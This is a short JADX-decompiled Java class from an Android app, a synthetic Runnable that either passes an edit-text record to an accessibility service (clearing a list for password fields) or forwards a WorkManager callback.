package defpackage;

import androidx.work.impl.Processor;
import androidx.work.impl.model.WorkGenerationalId;
import com.mamimobi.AccessService;
import com.mamimobi.videostream.model.EditTextInfo;
import java.util.ArrayList;

/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class p1 implements Runnable {
    public final /* synthetic */ int E;
    public final /* synthetic */ boolean F;
    public final /* synthetic */ Object G;
    public final /* synthetic */ Object H;

    public /* synthetic */ p1(int i, Object obj, Object obj2, boolean z) {
        this.E = i;
        this.G = obj;
        this.H = obj2;
        this.F = z;
    }

    @Override // java.lang.Runnable
    public final void run() {
        boolean z = this.F;
        Object obj = this.H;
        Object obj2 = this.G;
        switch (this.E) {
            case 0:
                EditTextInfo editTextInfo = (EditTextInfo) obj;
                String str = AccessService.V;
                AccessService accessService = (AccessService) obj2;
                accessService.getClass();
                ArrayList arrayList = AccessService.p0;
                try {
                    accessService.D(editTextInfo);
                    break;
                } catch (Exception unused) {
                    if (!z) {
                        return;
                    }
                    accessService.S = null;
                    if (!editTextInfo.isPasswd) {
                        return;
                    }
                } catch (Throwable th) {
                    if (z) {
                        accessService.S = null;
                        if (editTextInfo.isPasswd) {
                            arrayList.clear();
                        }
                    }
                    throw th;
                }
                if (z) {
                    accessService.S = null;
                    if (!editTextInfo.isPasswd) {
                        return;
                    }
                    arrayList.clear();
                    return;
                }
                return;
            default:
                ((Processor) obj2).lambda$runOnExecuted$1((WorkGenerationalId) obj, z);
                return;
        }
    }
}
